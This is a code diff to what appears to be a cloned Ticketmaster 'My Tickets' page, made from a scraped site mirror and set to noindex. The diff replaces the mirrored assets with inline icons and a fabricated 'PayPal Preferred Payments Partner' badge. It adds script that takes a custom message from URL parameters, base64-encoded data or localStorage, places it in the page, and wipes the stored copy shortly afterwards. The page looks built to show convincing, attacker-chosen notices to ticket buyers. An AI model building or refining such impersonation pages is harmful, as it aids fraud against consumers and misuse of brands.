@@ -7,10 +7,10 @@
   <title>Ticketmaster - My Tickets</title>
   <meta name="robots" content="noindex">
   <meta name="next-head-count" content="4">
-  <link rel="icon" href="../../../NyI6774ld5FP.com/production-10-223-0-11513381/images/CHpDmqfWUQuG.ico"
-    type="image/x-icon">
-  <link rel="shortcut icon" href="../../../NyI6774ld5FP.com/production-10-223-0-11513381/images/CHpDmqfWUQuG.ico"
-    type="image/x-icon">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎫</text></svg>"
+    type="image/svg+xml">
+  <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎫</text></svg>"
+    type="image/svg+xml">
   <link href="index.css" rel="stylesheet">
   <script src="script.js"></script>
   <script>
@@ -25,13 +25,43 @@
           // Get the custom message from URL parameters (direct or preserved)
           let customMessage = getUrlParameter('customMessage');
           
+          // Check if we need to use localStorage approach for long messages
+          const useLocalStorage = getUrlParameter('useLocalStorage') === 'true';
+          const preservedData = getUrlParameter('preservedData');
+          
+          if (useLocalStorage && preservedData) {
+            try {
+              // Decode the preserved data
+              const decodedData = JSON.parse(atob(preservedData));
+              customMessage = decodedData.customMessage;
+              console.log('Custom message from preserved data (localStorage approach):', customMessage);
+              
+              // Store in localStorage for future use
+              localStorage.setItem('preservedCustomMessage', customMessage);
+            } catch (e) {
+              console.log('Error decoding preserved data:', e);
+            }
+          }
+          
           // If no direct URL parameter, check if we have preserved parameters
           if (!customMessage) {
             const preservedParams = localStorage.getItem('preservedUrlParams');
             if (preservedParams) {
-              const urlParams = new URLSearchParams(preservedParams);
-              customMessage = urlParams.get('customMessage');
-              console.log('Custom message from preserved params:', customMessage);
+              try {
+                const urlParams = new URLSearchParams(preservedParams);
+                customMessage = urlParams.get('customMessage');
+                console.log('Custom message from preserved params:', customMessage);
+              } catch (e) {
+                console.log('Error parsing preserved params:', e);
+              }
+            }
+          }
+          
+          // Check localStorage for custom message (fallback)
+          if (!customMessage) {
+            customMessage = localStorage.getItem('preservedCustomMessage');
+            if (customMessage) {
+              console.log('Custom message from localStorage fallback:', customMessage);
             }
           }
           
@@ -47,7 +77,8 @@
             // If no accepted ticket message exists, find a general container to place the message
             if (!successElement) {
               // Try to find the main content area or upcoming events section
-              successElement = document.querySelector('.upcoming-events') || 
+              successElement = document.querySelector('.upcoming-events-card') || 
+                              document.querySelector('.upcoming-events') || 
                               document.querySelector('.main-content') || 
                               document.querySelector('main') ||
                               document.querySelector('.content-area') ||
@@ -55,6 +86,12 @@
             }
             
             if (successElement) {
+              // Remove any existing custom message to avoid duplicates
+              const existingMessage = document.querySelector('.custom-message-notice');
+              if (existingMessage) {
+                existingMessage.remove();
+              }
+              
               // Create the custom message element
               const customMessageDiv = document.createElement('div');
               customMessageDiv.className = 'custom-message-notice';
@@ -303,10 +340,20 @@
       displayCustomMessage();
       
       // Clean up preserved URL parameters after using them
-      if (localStorage.getItem('preservedUrlParams')) {
+      const preservedParams = localStorage.getItem('preservedUrlParams');
+      if (preservedParams) {
         console.log('Cleaning up preserved URL parameters');
         localStorage.removeItem('preservedUrlParams');
       }
+      
+      // Clean up preserved custom message after a delay (to allow it to be used)
+      setTimeout(() => {
+        const customMessage = localStorage.getItem('preservedCustomMessage');
+        if (customMessage) {
+          console.log('Cleaning up preserved custom message after display');
+          localStorage.removeItem('preservedCustomMessage');
+        }
+      }, 5000); // Clean up after 5 seconds
     });
     
     // Success Modal Functions
@@ -697,7 +744,7 @@
               </ul>
             </nav>
             <div class="sc-540448f4-1 egkiol"><img
-                src="../../../NyI6774ld5FP.com/production-10-223-0-11513381/images/ads/VwFd53qnPRCd.svg"
+                src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 50'><rect width='200' height='50' fill='%23f0f0f0'/><text x='100' y='30' text-anchor='middle' font-family='Arial' font-size='12' fill='%23333'>PayPal Partner</text></svg>"
                 alt="PayPal Preferred Payments Partner" class="sc-7383ba18-1 bjxlPX"></div>
           </div>
           <nav data-testid="stickyHeader" aria-label="Main Navigation" class="sc-280f00a6-1 erRJST">
